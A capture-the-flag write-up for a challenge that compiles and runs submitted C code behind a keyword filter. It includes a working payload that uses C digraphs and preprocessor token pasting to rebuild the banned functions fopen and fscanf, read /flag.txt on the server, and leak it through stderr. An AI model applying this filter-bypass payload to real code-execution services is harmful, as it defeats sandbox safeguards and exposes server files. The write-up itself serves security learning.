## Investigation
Inspecting the source code of the page hints us in an html comment that the flag can be found in a text file on the servers root directory. A quick look at the linked javascript also reveals that as soon as an error response is received from the server, we are presented the error details. This is our way to leak information from the server. And indeed, when writing to _stderr_ and exiting the program with an error, we are presented with the error output in the alert.

My idea was to just open the _/flag.txt_, read its content, print it to _stderr_ and then exit the main function with an error to report the information back. Unfortunately, some source code filter is applied and I got an answer that the _dangerous keyword 'fopen' has been detected_ and my code wouldn't run. After trying a few other approaches I quickly realized most of the interesting functions found in _stdio.h_ were prohibited.

I then tried to close the main function early with a ```}``` and ```#include "/flag.txt"``` afterwards, provoking a compilation error showing me the contents of the file in the error output. But no luck, ```include``` as well as the ```#```-symbol were considered dangerous, too.

## Solution
My final solution was to bypass the source code filter by inserting the dangerous functions at compile time. The key here was to use macros and let the pre-processor concatenate the dangerous function names from two strings with the ```##```-directive to not trigger the source code filter. To counter the prohibition of the ```#```-symbol itself I used [digraphs](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C).

##### payload:
```C
    flag();
    return 1;
}

%:define OPEN(path, mode) fop%:%:en(path, mode)
%:define SCAN(f, fmt, buf) fsca%:%:nf(f, fmt, buf)

int flag() {
    char buf[128];
    FILE *f;
    f = OPEN("/flag.txt", "r");
    SCAN(f, "%s", buf);
    fprintf(stderr, buf);
```

##### flag:
```
SCTF{take-care-when-execute-unknown-code}
```
